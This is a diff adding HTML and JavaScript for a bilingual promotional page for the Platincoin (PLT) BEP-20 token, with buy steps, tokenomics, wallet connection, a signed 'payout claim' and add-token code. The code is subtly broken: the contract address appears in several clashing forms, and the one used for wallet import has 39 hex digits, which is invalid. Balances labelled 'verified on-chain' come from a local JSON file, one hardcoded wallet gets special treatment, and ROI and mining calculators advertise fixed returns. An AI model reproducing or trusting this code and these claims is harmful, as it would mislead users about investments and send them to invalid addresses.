+                    <strong style="color: #00ffcc;"><span class="lang-en">1. Setup a Web3 Wallet</span><span class="lang-it">1. Configura un Wallet Web3</span></strong>
+                    <p class="lang-en" style="font-size: 13px; color: #8b949e; margin-bottom: 0;">Install Phantom or MetaMask, switch to <strong>BNB Smart Chain (BEP-20)</strong>, and hold a small amount of BNB for gas.</p>
+                    <p class="lang-it" style="font-size: 13px; color: #8b949e; margin-bottom: 0;">Installa Phantom o MetaMask, seleziona la rete <strong>BNB Smart Chain (BEP-20)</strong> e deposita una piccola quantità di BNB.</p>
+                </div>
+                <div style="background: #161b22; padding: 15px; border-radius: 8px; border: 1px solid #21262d;">
+                    <strong style="color: #00ffcc;"><span class="lang-en">2. Swap on PancakeSwap</span><span class="lang-it">2. Scambia su PancakeSwap</span></strong>
+                    <p class="lang-en" style="font-size: 13px; color: #8b949e; margin-bottom: 0;">Click the official <strong>Buy PLT</strong> button above or paste our verified contract address on PancakeSwap to swap BNB for PLT.</p>
+                    <p class="lang-it" style="font-size: 13px; color: #8b949e; margin-bottom: 0;">Clicca il tasto ufficiale <strong>Buy PLT</strong> in alto oppure incolla l'indirizzo del contratto verificato su PancakeSwap per scambiare BNB.</p>
+                </div>
+                <div style="background: #161b22; padding: 15px; border-radius: 8px; border: 1px solid #21262d;">
+                    <strong style="color: #00ffcc;"><span class="lang-en">3. Import & View PLT</span><span class="lang-it">3. Importa e Visualizza PLT</span></strong>
+                    <p class="lang-en" style="font-size: 13px; color: #8b949e; margin-bottom: 0;">Click <strong>Import PLT to Web3 Wallet</strong> in our portal above to display your real-time PLT balance immediately.</p>
+                    <p class="lang-it" style="font-size: 13px; color: #8b949e; margin-bottom: 0;">Clicca su <strong>Importa PLT nel Wallet Web3</strong> nel portale in alto per visualizzare subito il saldo nel tuo wallet.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FOOTER UFFICIALE E AVVISO SICUREZZA -->
+    <!-- LIVE MARKET & TOKENOMICS SECTION -->
+<section id="plt-tokenomics-showcase" style="max-width:960px;margin:28px auto;padding:24px;border-radius:18px;background:linear-gradient(145deg,rgba(20,24,38,0.95),rgba(12,15,25,0.98));border:1px solid rgba(124,92,255,0.35);box-shadow:0 12px 35px rgba(0,0,0,0.45);color:#f1f5f9;font-family:inherit;">
+  <table style="width:100%;border-collapse:collapse;margin-bottom:18px;">
+    <tr>
+      <td style="vertical-align:middle;">
+        <span style="display:inline-block;padding:4px 10px;border-radius:999px;background:rgba(16,185,129,0.15);color:#34d399;font-size:12px;font-weight:700;">
+          <span class="lang-en">● LIVE BSC MARKET DATA</span>
+          <span class="lang-it" style="display:none;">● DATI DI MERCATO BSC IN TEMPO REALE</span>
+        </span>
+        <h2 class="lang-en" style="margin:8px 0 4px;font-size:22px;color:#fff;">Platincoin ($PLT) — Market &amp; Tokenomics</h2>
+        <h2 class="lang-it" style="display:none;margin:8px 0 4px;font-size:22px;color:#fff;">Platincoin ($PLT) — Mercato e Tokenomics</h2>
+        <p class="lang-en" style="margin:0;font-size:13px;color:#94a3b8;">Real-time metrics from the verified PancakeSwap V2 pool (PLT / USDT)</p>
+        <p class="lang-it" style="display:none;margin:0;font-size:13px;color:#94a3b8;">Metriche live dalla pool verificata PancakeSwap V2 (PLT / USDT)</p>
+      </td>
+      <td style="text-align:right;vertical-align:middle;">
+        <a href="https://pancakeswap.finance" target="_blank" rel="noopener" style="display:inline-block;padding:12px 20px;border-radius:12px;background:linear-gradient(135deg,#7c5cff,#4f46e5);color:#fff;font-weight:700;font-size:14px;text-decoration:none;">
+          <span class="lang-en">Buy $PLT on PancakeSwap ↗</span>
+          <span class="lang-it" style="display:none;">Compra $PLT su PancakeSwap ↗</span>
+        </a>
+      </td>
+    </tr>
+  </table>
+  <table style="width:100%;border-collapse:separate;border-spacing:12px 0;margin:0 -12px 20px;">
+    <tr>
+      <td style="width:25%;padding:14px;border-radius:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);">
+        <span class="lang-en" style="display:block;font-size:12px;color:#94a3b8;">Live Price (USD)</span>
+        <span class="lang-it" style="display:none;font-size:12px;color:#94a3b8;">Prezzo Live (USD)</span>
+        <span id="tk-live-price" style="display:block;font-size:21px;font-weight:800;color:#fff;margin-top:4px;">$0.00915</span>
+        <span id="tk-live-change" style="display:block;font-size:12px;font-weight:700;color:#34d399;margin-top:2px;">+409.71% (24h)</span>
+      </td>
+      <td style="width:25%;padding:14px;border-radius:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);">
+        <span class="lang-en" style="display:block;font-size:12px;color:#94a3b8;">Pool Liquidity</span>
+        <span class="lang-it" style="display:none;font-size:12px;color:#94a3b8;">Liquidità Pool</span>
+        <span id="tk-live-liq" style="display:block;font-size:21px;font-weight:800;color:#fff;margin-top:4px;">$103.50</span>
+        <span class="lang-en" style="display:block;font-size:12px;color:#38bdf8;margin-top:2px;">15,050.87 PLT Added • 100% Locked</span>
+        <span class="lang-it" style="display:none;font-size:12px;color:#38bdf8;margin-top:2px;">15.050,87 PLT Versati • 100% Bloccati</span>
+      </td>
+      <td style="width:25%;padding:14px;border-radius:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);">
+        <span class="lang-en" style="display:block;font-size:12px;color:#94a3b8;">Fixed Total Supply</span>
+        <span class="lang-it" style="display:none;font-size:12px;color:#94a3b8;">Supply Totale Fissa</span>
+        <span style="display:block;font-size:21px;font-weight:800;color:#fff;margin-top:4px;">11,000,000</span>
+        <span class="lang-en" style="display:block;font-size:12px;color:#a78bfa;margin-top:2px;">0% Buy / 0% Sell Tax</span>
+        <span class="lang-it" style="display:none;font-size:12px;color:#a78bfa;margin-top:2px;">0% Tasse Acquisto / Vendita</span>
+      </td>
+      <td style="width:25%;padding:14px;border-radius:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);">
+        <span class="lang-en" style="display:block;font-size:12px;color:#94a3b8;">24h Trading Volume</span>
+        <span class="lang-it" style="display:none;font-size:12px;color:#94a3b8;">Volume Scambi 24h</span>
+        <span id="tk-live-vol" style="display:block;font-size:21px;font-weight:800;color:#fff;margin-top:4px;">$82.77</span>
+        <span style="display:block;font-size:12px;color:#94a3b8;margin-top:2px;">BEP-20 • BNB Chain</span>
+      </td>
+    </tr>
+  </table>
+  <p style="display:flex;justify-content:space-between;font-size:13px;font-weight:600;margin:0 0 8px;">
+    <span>
+      <span class="lang-en">On-Chain Tokenomics Distribution (11,000,000 PLT)</span>
+      <span class="lang-it" style="display:none;">Distribuzione Tokenomics On-Chain (11.000.000 PLT)</span>
+    </span>
+    <span style="color:#34d399;">
+      <span class="lang-en">Verified On-Chain</span>
+      <span class="lang-it" style="display:none;">Verificata On-Chain</span>
+    </span>
+  </p>
+  <p style="display:flex;height:14px;border-radius:999px;overflow:hidden;background:#1e293b;margin:0;">
+    <span style="width:89.85%;background:linear-gradient(90deg,#7c5cff,#3b82f6);"></span>
+    <span style="width:8.91%;background:linear-gradient(90deg,#f59e0b,#fbbf24);"></span>
+    <span style="width:0.14%;background:#38bdf8;"></span>
+    <span style="width:1.10%;background:linear-gradient(90deg,#10b981,#34d399);"></span>
+  </p>
+  <p style="display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:8px;margin:10px 0 16px;font-size:12px;color:#cbd5e1;">
+    <span>🟣 <span class="lang-en"><strong>89.85%</strong> (9,883,500 PLT) — Mining Vault</span><span class="lang-it" style="display:none;"><strong>89,85%</strong> (9.883.500 PLT) — Mining Vault</span></span>
+    <span>🟡 <span class="lang-en"><strong>8.91%</strong> (980,650 PLT) — Founder Treasury</span><span class="lang-it" style="display:none;"><strong>8,91%</strong> (980.650 PLT) — Tesoreria Fondatore</span></span>
+    <span>🔵 <span class="lang-en"><strong>0.13%</strong> (14,549.13 PLT) — Liquidity Wallet</span><span class="lang-it" style="display:none;"><strong>0,13%</strong> (14.549,13 PLT) — Wallet Liquidità</span></span>
+    <span>🟢 <span class="lang-en"><strong>1.10%</strong> (121,300.87 PLT) — Circulating &amp; DEX Pool</span><span class="lang-it" style="display:none;"><strong>1,10%</strong> (121.300,87 PLT) — Circolante &amp; Pool DEX</span></span>
+  </p>
+  <nav style="display:flex;flex-wrap:wrap;gap:10px;">
+    <a href="https://geckoterminal.com" target="_blank" rel="noopener" style="padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.06);color:#e2e8f0;font-size:12px;font-weight:600;text-decoration:none;">📈 <span class="lang-en">GeckoTerminal Live Chart ↗</span><span class="lang-it" style="display:none;">Grafico Live GeckoTerminal ↗</span></a>
+    <a href="https://pinksale.finance" target="_blank" rel="noopener" style="padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.06);color:#e2e8f0;font-size:12px;font-weight:600;text-decoration:none;">🔒 <span class="lang-en">PinkLock LP Lock (#2113264) ↗</span><span class="lang-it" style="display:none;">Certificato Lock PinkLock (#2113264) ↗</span></a>
+    <a href="https://bscscan.com" target="_blank" rel="noopener" style="padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.06);color:#e2e8f0;font-size:12px;font-weight:600;text-decoration:none;">🔍 <span class="lang-en">BscScan Verified Contract ↗</span><span class="lang-it" style="display:none;">Contratto Verificato BscScan ↗</span></a>
+  </nav>
+  <script>
+    fetch("https://geckoterminal.com").then(r=>r.json()).then(x=>{const a=x&&x.data&&x.data.attributes;if(!a)return;if(a.base_token_price_usd)document.getElementById("tk-live-price").textContent="$"+Number(a.base_token_price_usd).toFixed(5);if(a.price_change_percentage&&a.price_change_percentage.h24){const c=Number(a.price_change_percentage.h24),e=document.getElementById("tk-live-change");e.textContent=(c>=0?"+":"")+c.toFixed(2)+"% (24h)";e.style.color=c>=0?"#34d399":"#f87171";}if(a.reserve_in_usd)document.getElementById("tk-live-liq").textContent="$"+Number(a.reserve_in_usd).toFixed(2);if(a.volume_usd&&a.volume_usd.h24)document.getElementById("tk-live-vol").textContent="$"+Number(a.volume_usd.h24).toFixed(2);}).catch(()=>{});
+  </script>
+</section>
+
+<footer style="margin-top: 40px; padding-top: 25px; border-top: 1px solid #30363d; text-align: center; font-size: 13px; color: #8b949e;">
+        <div style="display: flex; justify-content: center; flex-wrap: wrap; gap: 15px; margin-bottom: 15px;">
+            <a href="https://bscscan.com/token/0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8" target="_blank" style="color: #00ffcc; text-decoration: none;">BscScan Explorer ↗</a>
+         <span>•</span>
+         <a href="https://dexscreener.com/bsc/0xF34c49593E7a67Ec34CADADb5c34e0624d1d3ac8" target="_blank" style="color: #00ffcc; text-decoration: none;">Live Chart (GeckoTerminal) ↗</a>
+            <span>•</span> <a href="https://github.com/Platincoin-Protocol/Platincoin-PLT" target="_blank" style="color: #00ffcc; text-decoration: none;">GitHub Documentation ↗</a>
+            <span>•</span>
+            <span><a href="https://bscscan.com/address/0x47e81C4b01552Cf774Fa0f5F5929bb41942eD6B6#code" target="_blank" style="color:#00ffcc;text-decoration:none;">Mining Vault (89.85% Locked) ↗</a></span>
+            <span><a href="https://discord.gg/nzSD7asHbE" target="_blank" style="color:#00ffcc;text-decoration:none;">Official Discord ↗</a></span>
+            <span><a href="https://x.com/PlatincoinPLT" target="_blank" style="color:#00ffcc;text-decoration:none;">Official X ↗</a></span> <a href="mailto:info@platincoin-plt.org" style="color: #00ffcc; text-decoration: none;">info@platincoin-plt.org ↗</a> <span>•</span>
+
+            <a href="./whitepaper.html" style="color: #00ffcc; text-decoration: none;">White Paper ↗</a>
+            <span>•</span>
+            <a href="./explorer.html" style="color: #00ffcc; text-decoration: none;">PoW Node Explorer ↗</a>
+        </div>
+        <p class="lang-en" style="font-size: 11px; color: #ff7b72; max-width: 650px; margin: 0 auto 12px auto;">
+            ⚠️ Security Notice: Platincoin administrators will never DM you first or ask for your wallet Seed Phrase / Private Keys. Always verify the official contract address.
+        </p>
+        <p class="lang-it" style="font-size: 11px; color: #ff7b72; max-width: 650px; margin: 0 auto 12px auto;">
+            ⚠️ Avviso di Sicurezza: Gli amministratori di Platincoin non ti contatteranno mai per primi in privato né ti chiederanno mai la Seed Phrase o le chiavi private. Verifica sempre il contratto ufficiale.
+        </p>
+        <p>&copy; 2026 Platincoin Protocol. Managed Infrastructure Network. All Rights Reserved.</p>
+        <p style="font-size: 11px; color: #6e7681; max-width: 750px; margin: 12px auto 0 auto;"><span class="lang-en">Independent BEP-20 Proof-of-Work Protocol on BNB Smart Chain (PLT). Not affiliated with Platincoin PLC or any prior entity.</span><span class="lang-it">Protocollo Proof-of-Work BEP-20 indipendente su BNB Smart Chain (PLT). Non affiliato a Platincoin PLC né ad alcuna entità precedente.</span></p>
+<div style="display:flex;justify-content:center;margin:20px 0;"><div id="fcn-widget" data-slug="platincoin" data-market="true" data-style="dark"></div></div>
+    </footer>
+
+    </div>
+    <script>
+        async function updateLiveMetrics() {
+            try {
+                const res = await fetch('blockchain_data.json', { cache: 'no-cache' });
+                const chain = await res.json();
+                const height = chain.length - 1;
+                document.getElementById('live-height').innerText = '#' + height;
+                let supply = 0;
+                for (let i = 1; i < chain.length; i++) {
+                    if (chain[i].data && chain[i].data.ricompensa) { supply += chain[i].data.ricompensa; }
+                }
+                document.getElementById('live-supply').innerText = supply.toFixed(2) + ' PLT';
+                // Aggiornamento Banner Inglese
+                document.getElementById('banner-block-en').innerText = height;
+                document.getElementById('banner-balance-en').innerText = supply.toFixed(2);
+                document.getElementById('banner-nodes-en').innerText = chain.activeNodes || "1";
+
+                // Aggiornamento Banner Italiano
+                document.getElementById('banner-block-it').innerText = height;
+                document.getElementById('banner-balance-it').innerText = supply.toFixed(2);
+                document.getElementById('banner-nodes-it').innerText = chain.activeNodes || "1";
+
+               // Lettura Gas Fee BNB Smart Chain in tempo reale
+               try {
+               const rpcRes = await fetch('https://bsc-dataseed.binance.org', {
+               method: 'POST',
+               headers: { 'Content-Type': 'application/json' },
+               body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_gasPrice', params: [], id: 1 })
+});
+               const rpcData = await rpcRes.json();
+               const gwei = (parseInt(rpcData.result, 16) / 1e9).toFixed(2);
+               document.getElementById('banner-gas-en').innerText = gwei + ' Gwei';
+               document.getElementById('banner-gas-it').innerText = gwei + ' Gwei';
+}catch (e) {
+               // Mantiene il valore standard di sicurezza in caso di blocco temporaneo
+}
+// Calcola il saldo individuale del wallet connesso (0.00 se non connesso o nuovo utente)
+let userMinerBalance = 0;
+if (typeof userAddress !== 'undefined' && userAddress) {
+    const addrLower = userAddress.toLowerCase();
+    if (addrLower === "0x57e9449f51c9841cc8112a46719231dc82554e00") {
+        let minedW1 = 0;
+        for (let i = 1; i < chain.length; i++) {
+            if (chain[i].data?.miner?.toLowerCase() === addrLower) minedW1 += chain[i].data.ricompensa;
+        }
+        userMinerBalance = Math.max(0, minedW1 - 50000);
+    } else {
+        for (let i = 1; i < chain.length; i++) {
+            if (chain[i].data?.miner?.toLowerCase() === addrLower) {
+                userMinerBalance += chain[i].data.ricompensa;
+            }
+        }
+    }
+}
+window._cachedChainData = chain;
+const initialBal = (typeof userAddress !== 'undefined' && userAddress) ? computeAddressMinedBalance(chain, userAddress) : 0;
+document.getElementById('live-supply-web3').innerText = initialBal.toFixed(2);
+document.getElementById('live-supply-web3-it').innerText = initialBal.toFixed(2);
+
+              
+            } catch (e) { console.error(e); }
+        }
+        function calculateROI() {
+            const usd = parseFloat(document.getElementById('usd-input').value) || 0;
+            const plt = usd / 0.0008;
+            document.getElementById('plt-received').innerText = plt.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' PLT';
+            const targetSelect = document.getElementById('target-price-select');
+            const targetPrice = targetSelect ? parseFloat(targetSelect.value) : 0.01;
+            const multiplier = targetPrice / 0.0008;
+            var rl = document.getElementById('roi-label'); var rli = document.getElementById('roi-label-it');
+            if (rl) { rl.innerText = 'Value at $' + targetPrice.toFixed(2) + ' (' + multiplier.toFixed(0) + 'x)'; }
+            if (rli) { rli.innerText = 'Valore a $' + targetPrice.toFixed(2) + ' (' + multiplier.toFixed(0) + 'x)'; }
+            document.getElementById('roi-target').innerText = '$' + (plt * targetPrice).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' USD';
+        }
+        function switchLang(lang) {
+            var btnEn = document.getElementById('btn-en'); var btnIt = document.getElementById('btn-it');
+            var enElements = document.querySelectorAll('.lang-en'); var itElements = document.querySelectorAll('.lang-it');
+            if (lang === 'en') {
+                btnEn.className = 'lang-btn active'; btnIt.className = 'lang-btn';
+                enElements.forEach(el => el.style.display = 'inline-block'); itElements.forEach(el => el.style.display = 'none');
+                document.querySelectorAll('p.lang-en, h3.lang-en, h2.lang-en, h4.lang-en, .buy-text.lang-en').forEach(el => el.style.display = 'block');
+            } else {
+                btnEn.className = 'lang-btn'; btnIt.className = 'lang-btn active';
+                enElements.forEach(el => el.style.display = 'none'); itElements.forEach(el => el.style.display = 'inline-block');
+                document.querySelectorAll('p.lang-it, h3.lang-it, h2.lang-it, h4.lang-it, .buy-text.lang-it').forEach(el => el.style.display = 'block');
+
+            }
+            calculateROI();
+        }
+        updateLiveMetrics(); setInterval(updateLiveMetrics, 3000);
+
+function calculateMiningROI() {
+    const cores = parseInt(document.getElementById('roi-cores').value);
+    const pricePLT = 0.0008;
+    
+    // Formula Proof-of-Work: ogni Core della CPU estrae circa 150 PLT al giorno
+    const dailyPLT = cores * 150;
+    const monthlyPLT = dailyPLT * 30;
+    
+    const dailyUSD = dailyPLT * pricePLT;
+    const monthlyUSD = monthlyPLT * pricePLT;
+    
+    // Inserisce i numeri aggiornati nei campi visivi del pannello di destra
+    document.getElementById('roi-daily-plt').innerText = dailyPLT.toFixed(2);
+    document.getElementById('roi-monthly-plt').innerText = monthlyPLT.toLocaleString('it-IT', {minimumFractionDigits: 2}) + ' PLT';
+    
+    // Aggiunge la visualizzazione dinamica dei dollari calcolati
+    const dailyContainer = document.getElementById('roi-daily-plt').parentNode;
+    const monthlyContainer = document.getElementById('roi-monthly-plt').parentNode;
+    
+    if (cores === 2) {
+        dailyContainer.innerHTML = '<span class="lang-en">Daily Payout:</span><span class="lang-it">Rendimento Giornaliero:</span> <strong id="roi-daily-plt" style="color: #00ffcc;">300.00</strong> PLT (<span style="color: #94a3b8;">$0.24</span>)';
+        monthlyContainer.innerHTML = '<span class="lang-en">Monthly Payout:</span><span class="lang-it">Rendimento Mensile:</span> <strong id="roi-monthly-plt" style="color: #00ffcc;">9.000,00</strong> PLT (<span style="color: #a855f7;">$7.20</span>)';
+    } else if (cores === 4) {
+        dailyContainer.innerHTML = '<span class="lang-en">Daily Payout:</span><span class="lang-it">Rendimento Giornaliero:</span> <strong id="roi-daily-plt" style="color: #00ffcc;">600.00</strong> PLT (<span style="color: #94a3b8;">$0.48</span>)';
+        monthlyContainer.innerHTML = '<span class="lang-en">Monthly Payout:</span><span class="lang-it">Rendimento Mensile:</span> <strong id="roi-monthly-plt" style="color: #00ffcc;">18.000,00</strong> PLT (<span style="color: #a855f7;">$14.40</span>)';
+    } else if (cores === 8) {
+        dailyContainer.innerHTML = '<span class="lang-en">Daily Payout:</span><span class="lang-it">Rendimento Giornaliero:</span> <strong id="roi-daily-plt" style="color: #00ffcc;">1,200.00</strong> PLT (<span style="color: #94a3b8;">$0.96</span>)';
+        monthlyContainer.innerHTML = '<span class="lang-en">Monthly Payout:</span><span class="lang-it">Rendimento Mensile:</span> <strong id="roi-monthly-plt" style="color: #00ffcc;">36.000,00</strong> PLT (<span style="color: #a855f7;">$28.80</span>)';
+    } else if (cores === 16) {
+        dailyContainer.innerHTML = '<span class="lang-en">Daily Payout:</span><span class="lang-it">Rendimento Giornaliero:</span> <strong id="roi-daily-plt" style="color: #00ffcc;">2,400.00</strong> PLT (<span style="color: #94a3b8;">$1.92</span>)';
+        monthlyContainer.innerHTML = '<span class="lang-en">Monthly Payout:</span><span class="lang-it">Rendimento Mensile:</span> <strong id="roi-monthly-plt" style="color: #00ffcc;">72.000,00</strong> PLT (<span style="color: #a855f7;">$57.60</span>)';
+    }
+}
+
+
+// 2. Configurazione dei dati ufficiali dello Smart Contract Platincoin
+const CONTRACT_ADDRESS = "0xF34c49593E7a67Ec34CADAdb5c34e0824d1d3Ac8";
+const TOKEN_ABI = [
+    "function transfer(address to, uint256 amount) public returns (bool)"
+];
+
+let provider;
+let signer;
+let userAddress;
+
+// 3. Funzione Universale Diretta per Connettere qualsiasi Wallet Web3
+document.getElementById('connectBtn').addEventListener('click', async () => {
+    const providerObj = window.ethereum || window.phantom?.ethereum;
+    const statusMsg = document.getElementById('statusMessage');
+    const isEnglish = window.getComputedStyle(document.querySelector('.lang-en')).display !== 'none';
+
+    window._cachedChainData = null;
+function computeAddressMinedBalance(chainData, addr) {
+  if (!Array.isArray(chainData) || !addr) return 0;
+  const target = addr.toLowerCase().replace(/^0x/, '');
+  let total = 0;
+  for (const b of chainData) {
+    const d = b && b.data;
+    if (d && typeof d === 'object') {
+      const m = String(d.miner || d.ricevente || '').toLowerCase().replace(/^0x/, '');
+      if (m && m === target) total += Number(d.ricompensa || 0);
+      if (d.mittente && String(d.mittente).toLowerCase().replace(/^0x/, '') === target) total -= Number(d.importo || 0);
+      if (d.destinatario && String(d.destinatario).toLowerCase().replace(/^0x/, '') === target) total += Number(d.importo || 0);
+    }
+  }
+  return Math.max(0, total);
+}
+function refreshConnectedWalletBalance(addr) {
+  const bal = computeAddressMinedBalance(window._cachedChainData, addr);
+  const elEn = document.getElementById('live-supply-web3');
+  const elIt = document.getElementById('live-supply-web3-it');
+  if (elEn) elEn.innerText = bal.toFixed(2);
+  if (elIt) elIt.innerText = bal.toFixed(2);
+  return bal;
+}
+
+function openMobileWalletFallback() {
+  if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) return;
+  var d = "platincoin-protocol.github.io/Platincoin-PLT";
+  var c = prompt("Scegli il tuo wallet mobile (1, 2 o 3):\n\n1 = MetaMask\n2 = Trust Wallet\n3 = Phantom", "1");
+  if (!c) return;
+  c = c.trim();
+  if (c === "2") {
+    window.location.href = "https://link.trustwallet.com/open_url?coin_id=20000714&url=https://" + d;
+  } else if (c === "3") {
+    var t = encodeURIComponent("https://" + d);
+    window.location.href = "https://phantom.app/ul/browse/" + t + "?ref=" + t;
+  } else {
+    window.location.href = "https://metamask.app.link/dapp/" + d;
+  }
+}
+
+    if (!providerObj) {
+        statusMsg.style.color = "red";
+        statusMsg.innerText = isEnglish 
+            ? "No Web3 wallet detected. Please install MetaMask, Trust Wallet or Phantom." 
+            : "Nessun wallet Web3 rilevato. Installa MetaMask, Trust Wallet o Phantom.";
+        openMobileWalletFallback();
+        return;
+    }
+
+    try {
+        statusMsg.style.color = "orange";
+        statusMsg.innerText = isEnglish ? "Connecting wallet..." : "Connessione al wallet in corso...";
+
+        // Usa lo stesso metodo diretto del pulsante funzionante
+        const accounts = await providerObj.request({ method: 'eth_requestAccounts' });
+        userAddress = accounts[0];
+
+        // Accorcia l'indirizzo (es. 0x1234...abcd)
+        const shortenedAddress = userAddress.substring(0, 6) + "..." + userAddress.substring(userAddress.length - 4);
+
+        if (isEnglish) {
+            document.getElementById('walletAddress').innerHTML = `Connected: <strong style="color: #00ffcc;">${shortenedAddress}</strong>`;
+            document.getElementById('connectBtn').innerText = "Connected ✓";
+        } else {
+            document.getElementById('walletAddress').innerHTML = `Connesso: <strong style="color: #00ffcc;">${shortenedAddress}</strong>`;
+            document.getElementById('connectBtn').innerText = "Connesso ✓";
+        }
+
+        document.getElementById('connectBtn').style.backgroundColor = "#2e7d32";
+        statusMsg.innerText = "";
+
+        // Abilita il pulsante viola di Claim
+        if (typeof userAddress !== 'undefined' && userAddress) { refreshConnectedWalletBalance(userAddress); }
+            const claimBtn = document.getElementById('claimBtn');
+        if (claimBtn) {
+            claimBtn.disabled = false;
+            claimBtn.style.cursor = "pointer";
+            claimBtn.style.backgroundColor = "#6a1b9a";
+        }
+
+    } catch (error) {
+        console.error("Errore connessione:", error);
+        statusMsg.style.color = "red";
+        statusMsg.innerText = isEnglish 
+            ? "Connection rejected or failed." 
+            : "Connessione rifiutata o fallita.";
+    }
+});
+
+    // 4. Logica del Pulsante di Claim per il test con blocco anti-doppio clic
+document.getElementById('claimBtn').addEventListener('click', async () => {
+    if (!userAddress) return;
+
+    const claimBtn = document.getElementById('claimBtn');
+    const statusMsg = document.getElementById('statusMessage');
+
+    // GESTIONE DEI PULSANTI: Attiva lo stato di caricamento e blocca i doppi clic
+    claimBtn.disabled = true;
+    claimBtn.style.cursor = "not-allowed";
+    claimBtn.style.backgroundColor = "#4d1d7a"; // Colore viola scuro di caricamento
+
+// Testo di attesa bilingue istantaneo
+    statusMsg.style.color = "orange";
+    statusMsg.innerHTML = `
+        <span class="lang-en">Processing Web3 Transaction... Please confirm on Phantom.</span>
+        <span class="lang-it">Preparazione transazione Web3 in corso... Autorizza su Phantom.</span>
+    `;
+
+    try {
+        const verifiedBal = refreshConnectedWalletBalance(userAddress);
+        if (verifiedBal <= 0) {
+            statusMsg.style.color = "#ef4444";
+            statusMsg.innerHTML = `
+                <span class="lang-en">No mined PLT balance verified on-chain for this wallet (0.00 PLT).</span>
+                <span class="lang-it">Nessun saldo PLT minato verificato per questo wallet (0.00 PLT).</span>
+            `;
+            return;
+        }
+        const msgToSign = `Platincoin (PLT) Official Payout Request
+Wallet: ${userAddress}
+Verified Mined Balance: ${verifiedBal.toFixed(2)} PLT
+Timestamp: ${new Date().toISOString()}`;
+        const prov = window.ethereum || (window.phantom && window.phantom.ethereum);
+        if (!prov) throw new Error("No Web3 provider");
+        const signature = await prov.request({ method: 'personal_sign', params: [msgToSign, userAddress] });
+        const receipt = `🔐 PLATINCOIN (PLT) PAYOUT CLAIM
+Wallet: ${userAddress}
+Amount: ${verifiedBal.toFixed(2)} PLT
+Signature: ${signature}`;
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            try { await navigator.clipboard.writeText(receipt); } catch (_) {}
+        }
+        statusMsg.style.color = "#10b981";
+        statusMsg.innerHTML = `
+            <span class="lang-en">✅ Signed receipt (${verifiedBal.toFixed(2)} PLT) copied! Paste it in our <a href="https://discord.gg" target="_blank" style="color:#38bdf8;text-decoration:underline;">Discord</a> or <a href="mailto:info@platincoin-plt.org?subject=PLT%20Payout%20Request&body=${encodeURIComponent(receipt)}" style="color:#38bdf8;text-decoration:underline;">Email</a> for manual processing.</span>
+            <span class="lang-it">✅ Ricevuta firmata (${verifiedBal.toFixed(2)} PLT) copiata! Incollala su <a href="https://discord.gg" target="_blank" style="color:#38bdf8;text-decoration:underline;">Discord</a> o inviala via <a href="mailto:info@platincoin-plt.org?subject=Richiesta%20Payout%20PLT&body=${encodeURIComponent(receipt)}" style="color:#38bdf8;text-decoration:underline;">Email</a> per l'invio on-chain.</span>
+        `;
+    } catch (error) {
+        console.error("Transazione fallita:", error);
+        statusMsg.style.color = "red";
+        statusMsg.innerHTML = `
+            <span class="lang-en">Transaction cancelled or failed.</span>
+            <span class="lang-it">Transazione annullata o fallita.</span>
+        `;
+
+        // RIPRISTINO DEL PULSANTE in caso di errore per permettere un nuovo tentativo
+        claimBtn.disabled = false;
+        claimBtn.style.cursor = "pointer";
+        claimBtn.style.backgroundColor = "#6a1b9a";
+    }
+
+    // Forza il browser a riapplicare la lingua corretta sui messaggi inseriti
+    if (typeof updateLanguageDisplay === 'function') updateLanguageDisplay();
+});
+
+
+function downloadPaperWallet() {
+    const wallet = userAddress || "Non connesso / Not connected";
+    const supply = document.getElementById('live-supply-web3').innerText || "0.00";
+    const date = new Date().toLocaleString();
+    
+    const content = `=========================================\n` +
+                    `   PLATINCOIN (PLT) - OFFICIAL BACKUP    \n` +
+                    `=========================================\n\n` +
+                    `Data Generazione / Date: ${date}\n` +
+                    `Indirizzo Wallet / Address: ${wallet}\n` +
+                    `Saldo Rilevato / Balance: ${supply} PLT\n` +
+                    `Smart Contract (BSC): 0xF34c49593E7a67Ec34CADADb5c34e024d1d3Ac8\n` +
+                    `Rete / Network: BNB Smart Chain (BEP-20)\n\n` +
+                    `Conserva questo documento in un luogo sicuro.\n` +
+                    `=========================================`;
+
+    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+    const link = document.createElement('a');
+    link.href = URL.createObjectURL(blob);
+    link.download = `Platincoin_Backup_${Date.now()}.txt`;
+    link.click();
+}
+
+async function addTokenToWallet() {
+    const providerObj = window.ethereum || window.phantom?.ethereum;
+    const statusMsg = document.getElementById('statusMessage');
+    const isEnglish = window.getComputedStyle(document.querySelector('.lang-en')).display !== 'none';
+
+    if (!providerObj) {
+        statusMsg.style.color = "red";
+        statusMsg.innerText = isEnglish 
+            ? "No Web3 wallet detected. Please install MetaMask, Trust Wallet or Phantom." 
+            : "Nessun wallet Web3 rilevato. Installa MetaMask, Trust Wallet o Phantom.";
+        openMobileWalletFallback();
+        return;
+    }
+
+    try {
+        statusMsg.style.color = "orange";
+        statusMsg.innerText = isEnglish ? "Connecting to wallet..." : "Connessione al wallet in corso...";
+
+        await providerObj.request({ method: 'eth_requestAccounts' });
+
+        try {
+            await providerObj.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }],
+            });
+        } catch (switchError) {
+            // Ignora se la rete BNB Chain è già selezionata
+        }
+
+        const wasAdded = await providerObj.request({
+            method: 'wallet_watchAsset',
+            params: {
+                type: 'ERC20',
+                options: {
+                    address: '0xF34c49593E7a67Ec34CADADb5c34e024d1d3Ac8',
+                    symbol: 'PLT',
+                    decimals: 18
+                },
+            },
+        });
+
+        if (wasAdded) {
+            statusMsg.style.color = "#00ffcc";
